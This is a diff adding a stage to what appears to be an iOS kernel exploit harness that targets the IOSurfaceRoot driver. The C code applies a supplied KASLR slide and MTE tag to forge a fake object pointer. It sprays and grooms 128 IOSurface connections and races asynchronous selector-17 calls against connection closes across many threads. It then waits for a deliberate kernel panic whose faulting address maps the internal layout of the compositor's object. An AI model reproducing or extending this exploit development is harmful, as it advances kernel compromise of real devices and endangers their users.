@@ -23955,6 +23955,194 @@ new_modes:
                 rlog("=== r=199 complete ===\n");
             }
 
+            /* ================================================================
+             * r=200: Slot 2 dereference offset probing
+             *
+             * Point slot 2 at a known kernel address and observe crash behavior.
+             * The panic log's faulting address reveals which offset within the
+             * fake "IOSurface object" the compositor tried to dereference.
+             *
+             * Strategy: point slot 2 at __DATA segment start (non-zero, but
+             * mapped and readable). The compositor reads fields at various
+             * offsets. Some fields are just data reads (safe). Some fields
+             * are treated as pointers and followed (crash if the value at
+             * that offset isn't a valid pointer).
+             *
+             * From the panic log we learn:
+             * - The faulting address (FAR) = the value read from offset X
+             * - The PC = which compositor code path did the dereference
+             * - This maps the internal structure the compositor expects
+             *
+             * Usage: iosurface_sel17 200 <hex_slide> [<hex_target_off>] [<hex_tag>]
+             * target_off = offset from KC base to point slot 2 at
+             * Default: __DATA segment start (0xB6EC000 from segment layout)
+             * ================================================================ */
+            if (rounds == 200) {
+                rlog("=== r=200: Slot 2 dereference offset probe ===\n");
+
+                #define R200_DATA_SEG_OFF 0x0B6EC000ULL
+
+                uint64_t r200_slide = 0;
+                uint64_t r200_target_off = R200_DATA_SEG_OFF;
+                uint64_t r200_tag = 0xF;
+                int r200_have_slide = 0;
+
+                if (argc > 3) {
+                    const char *h = argv[3];
+                    r200_slide = 0;
+                    for (int i = 0; h[i]; i++) {
+                        char c = h[i];
+                        r200_slide <<= 4;
+                        if (c >= '0' && c <= '9') r200_slide |= (c - '0');
+                        else if (c >= 'a' && c <= 'f') r200_slide |= (c - 'a' + 10);
+                        else if (c >= 'A' && c <= 'F') r200_slide |= (c - 'A' + 10);
+                    }
+                    r200_have_slide = 1;
+                }
+                if (argc > 4) {
+                    const char *h = argv[4];
+                    r200_target_off = 0;
+                    for (int i = 0; h[i]; i++) {
+                        char c = h[i];
+                        r200_target_off <<= 4;
+                        if (c >= '0' && c <= '9') r200_target_off |= (c - '0');
+                        else if (c >= 'a' && c <= 'f') r200_target_off |= (c - 'a' + 10);
+                        else if (c >= 'A' && c <= 'F') r200_target_off |= (c - 'A' + 10);
+                    }
+                }
+                if (argc > 5) {
+                    const char *h = argv[5];
+                    r200_tag = 0;
+                    for (int i = 0; h[i]; i++) {
+                        char c = h[i];
+                        r200_tag <<= 4;
+                        if (c >= '0' && c <= '9') r200_tag |= (c - '0');
+                        else if (c >= 'a' && c <= 'f') r200_tag |= (c - 'a' + 10);
+                        else if (c >= 'A' && c <= 'F') r200_tag |= (c - 'A' + 10);
+                    }
+                    r200_tag &= 0xF;
+                }
+
+                if (!r200_have_slide) {
+                    rlog("  ERROR: need slide arg\n");
+                    rlog("  Usage: iosurface_sel17 200 <hex_slide> [<hex_target_off>] [<hex_tag>]\n");
+                    goto r200_done;
+                }
+
+                uint64_t r200_raw = R198_KC_BASE + r200_slide + r200_target_off;
+                uint64_t r200_target = (r200_raw & ~(0xFULL << 56)) | (r200_tag << 56);
+                r200_target = (r200_target & ~(0xFULL << 60)) | (0xFULL << 60);
+
+                rlog("  Slide:      0x%llx\n", (unsigned long long)r200_slide);
+                rlog("  Target off: 0x%llx\n", (unsigned long long)r200_target_off);
+                rlog("  MTE tag:    0x%llx\n", (unsigned long long)r200_tag);
+                rlog("  Target:     0x%016llx\n", (unsigned long long)r200_target);
+                rlog("  Slot layout: [0]=0, [1]=0, [2]=target (fake obj ptr)\n");
+                rlog("  Expected: CRASH — panic log FAR reveals dereference offset\n");
+                rlog("  Duration:  15 seconds max\n");
+
+                io_service_t r200_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!r200_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r200_done; }
+
+                #define R200_GROOM_N 128
+                io_connect_t r200_gconns[R200_GROOM_N];
+                mach_port_t r200_gwps[R200_GROOM_N];
+                int r200_gn = 0;
+                for (int g = 0; g < R200_GROOM_N; g++) {
+                    io_connect_t gc = IO_OBJECT_NULL;
+                    if (IOServiceOpen(r200_svc, mach_task_self(), 0, &gc) == KERN_SUCCESS) {
+                        mach_port_t gwp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                        mach_port_insert_right(mach_task_self(), gwp, gwp,
+                            MACH_MSG_TYPE_MAKE_SEND);
+                        r200_gconns[r200_gn] = gc;
+                        r200_gwps[r200_gn] = gwp;
+                        r200_gn++;
+                    }
+                }
+                rlog("  Pre-opened %d groom conns\n", r200_gn);
+
+                uint64_t r200_pdata[4] = {0, 0, r200_target, 0};
+                p16_groom_conns = r200_gconns;
+                p16_groom_wps = r200_gwps;
+                p16_groom_n = r200_gn;
+                p16_groom_data = r200_pdata;
+                p16_groom_count = 0;
+                p16_groom_run = 1;
+                pthread_t r200_gths[4];
+                for (int t = 0; t < 4; t++)
+                    pthread_create(&r200_gths[t], NULL, p16_groom_spray, NULL);
+                usleep(1000);
+
+                uint64_t r200_inp[3] = {1, 2, 3};
+                io_connect_t r200_pcs[8]; int r200_phave[8];
+                for (int i = 0; i < 8; i++) {
+                    r200_phave[i] = (IOServiceOpen(r200_svc, mach_task_self(), 0,
+                        &r200_pcs[i]) == KERN_SUCCESS);
+                    if (r200_phave[i]) {
+                        mach_port_t tw = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tw);
+                        mach_port_insert_right(mach_task_self(), tw, tw,
+                            MACH_MSG_TYPE_MAKE_SEND);
+                        uint64_t ref = 0xEE;
+                        IOConnectCallAsyncMethod(r200_pcs[i], 17, tw, &ref, 1,
+                            NULL, 0, r200_inp, 24, NULL, NULL, NULL, NULL);
+                        mach_port_deallocate(mach_task_self(), tw);
+                    } else r200_pcs[i] = IO_OBJECT_NULL;
+                }
+
+                p13_spam_run = 1;
+                p13_spam_conn = r200_phave[0] ? r200_pcs[0] : IO_OBJECT_NULL;
+                p13_spam_shape = 1;
+                p13_spam_count = 0;
+                pthread_t r200_spam[16];
+                for (int t = 0; t < 16; t++)
+                    pthread_create(&r200_spam[t], NULL, p13_spam_reg, NULL);
+
+                for (int i = 7; i >= 0; i--) {
+                    if (r200_phave[i]) { IOServiceClose(r200_pcs[i]); r200_phave[i] = 0; }
+                    usleep(100);
+                }
+                p13_spam_run = 0;
+                for (int t = 0; t < 16; t++) pthread_join(r200_spam[t], NULL);
+                for (int i = 0; i < 8; i++) if (r200_phave[i]) IOServiceClose(r200_pcs[i]);
+                usleep(2000);
+                p16_groom_run = 0;
+                for (int t = 0; t < 4; t++) pthread_join(r200_gths[t], NULL);
+
+                rlog("  Groom count=%llu\n", (unsigned long long)p16_groom_count);
+
+                rlog("\n  ** Starting 15s render loop — EXPECT CRASH **\n");
+                rlog("  ** Panic FAR = value at offset N within fake object **\n");
+                rlog("  ** Panic PC = compositor code doing the dereference **\n");
+
+                p13_render_run = 1;
+                p13_render_frames = 0;
+                pthread_t r200_pr;
+                pthread_create(&r200_pr, NULL, p13_render_loop, NULL);
+
+                for (int s = 0; s < 15; s++) {
+                    usleep(1000000);
+                    rlog("  +%ds alive, frames=%d\n", s + 1, p13_render_frames);
+                }
+
+                p13_render_run = 0;
+                pthread_join(r200_pr, NULL);
+
+                rlog("\n  ** SURVIVED 15s — unexpected! __DATA should have non-zero ptrs **\n");
+                rlog("  ** This means compositor fields at this address are all safe values **\n");
+
+                for (int g = 0; g < r200_gn; g++) {
+                    IOServiceClose(r200_gconns[g]);
+                    mach_port_deallocate(mach_task_self(), r200_gwps[g]);
+                }
+                IOObjectRelease(r200_svc);
+
+                r200_done:
+                rlog("=== r=200 complete ===\n");
+            }
+
             IOServiceClose(conn17);
             IOObjectRelease(svc17);
         }
